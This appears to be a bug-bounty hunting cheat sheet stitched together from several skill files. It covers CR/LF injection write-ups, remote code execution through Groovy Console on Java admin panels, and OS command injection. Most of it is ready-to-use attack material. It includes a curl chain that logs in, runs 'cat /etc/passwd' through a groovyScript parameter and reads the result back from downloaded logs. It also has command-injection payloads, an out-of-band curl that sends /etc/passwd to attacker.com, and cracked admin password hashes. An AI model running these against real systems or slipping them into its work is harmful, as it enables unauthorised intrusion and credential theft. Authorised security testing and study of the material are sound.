...
## Impact: RCE → Full system compromise, lateral movement.
CVE-2019-25224 (WordPress DB Backup plugin, 70K+ installs).



## a13h1 Medium Writeups — Injection (4 articles, ~$2,250)
- **$1,500 CR/LF Injection** — HTTP header injection via CR/LF characters
- **$1,500 Newline Injection in Folder Names** — Newline injection broke access revocation for folder shares
- **NewLine Character DoS: Folder & File Deletion** — CR/LF causing DoS via folder/file deletion
- **Time-Based SQL Injection** — First bounty: time-based SQLi in web application

## Groovy Console RCE (Java/JSF Admin Panels)

Groovy Console is a Java debugging tool that executes Groovy/Java code. Found in admin panels (often as `export_step2.xhtml`, `groovyConsole`, `console.groovy`). When accessible to authenticated admin users → **direct RCE**.

### Detection

Look for these patterns in admin panels:
- `export_step2.xhtml`, `export_step*.xhtml`
- `groovyConsole`, `groovyconsole`, `console.groovy`
- Any page with Groovy script input (textarea with "Run" button)
- JSF admin panels (`/faces/jsf/login.xhtml`) with Groovy features

### RCE Payloads

```groovy
// Basic — may show no output in console!
...
Groovy Console often executes commands but **does NOT return output** in the HTTP response. The output goes to server stdout/stderr, not the HTTP response body.

### Solution: Log-Chaining Technique

When RCE executes but output is invisible:

1. **Find a log endpoint** — Look for `/incident-report`, `/admin/logs`, `/admin/audit-log` that generate/download real-time logs
2. **Execute RCE command** — `print "cat /etc/passwd".execute().text`
3. **Download fresh logs** — The command output is captured in the server logs
4. **Read the output** — Command results appear in the log file

```bash
# Step 1: Login (if auth required)
curl -sk -c cookies.txt "https://target/admin/login" -d "user=admin&pass=..."

# Step 2: Execute Groovy RCE
curl -sk -b cookies.txt "https://target/admin/export_step2.xhtml" \
  -d "groovyScript=print \"cat /etc/passwd\".execute().text"

# Step 3: Download real-time logs
curl -sk -b cookies.txt -o logs.zip \
  "https://target/admin/incident-report"

# Step 4: Extract RCE output from logs
unzip -p logs.zip | grep -i "root:\|uid=\|command output"
```

**Why not OOB?** WAFs often block outbound connections. The log-chain technique:
- Works even when outbound is blocked
- Provides direct evidence (command output in logs)
- Often earns **higher bounties** than blind/OOB RCE

### Real-World Case Study

See `references/groovy-console-rce-chain.md` for the full $40,000 writeup by HX007:

**The 5-Step Chain:**
1. **Limited Path Traversal** → Read `/WEB-INF/web.xml` → found `/incident-report`
2. **Log Disclosure** → Downloaded real-time logs → found admin password hash
3. **Credential Crack** → `21232f297a57a5a743894a0e4a801fc3` = `admin` (MD5, old) / `2a92e4f4ecc321db24c8f389a287d793` = `Glglgl123` (working!)
4. **Admin Login** → Full admin panel access → Groovy Console
5. **RCE via Logs** → Groovy executes but no output → download incident-report → **RCE output is in the logs!** → $40,000 bounty

### Related Skills & References
- **`bug-bounty/information-disclosure/references/realtime-log-disclosure.md`** — Pattern for real-time log disclosure
- **`bug-bounty-techniques/references/groovy-console-rce-chain.md`** — Same case study
- **`hunt-source-leak`** — WEB-INF/web.xml discovery
- **`web-enumeration`** — Parameter fuzzing methodology
...
### 1. Classic (Direct) OS Command Injection
Output of injected command returned directly.
```python
os.popen("cat '/uploads/" + user_input + ".pdf'")
# Payload: dummyfile';id;x='
# Executes: cat '/uploads/dummyfile';id;x='.pdf'
```

### 2. Blind OS Command Injection
No command output visible in response.
```php
$path = "x; id";
$result = shell_exec("ls -an " . $path);
# Use reverse shell or OOB to confirm
```

### 3. Out-of-Band (OOB) OS Command Injection
Inject command that triggers external connection.
```bash
ping -c 1 $(whoami).attacker.com
curl http://attacker.com/submit?data=$(cat /etc/passwd)
sleep 5
```

### 4. Second-Order Command Injection
Command stored and executed later in different context.



## Tools
- Burp Suite Intruder for payload testing
- Commix for automated command injection testing
- DNS servers for OOB confirmation
...
---
# Merged from: hunt-ssti



## Detection Methodology
1. Identify input accepted by application
2. Inject delimiter: `;`, `|`, `&&`
3. Try `id` or `whoami` command
4. For blind: use sleep or OOB
5. For OOB: trigger DNS/HTTP callback
6. Confirm with timing or external server logs
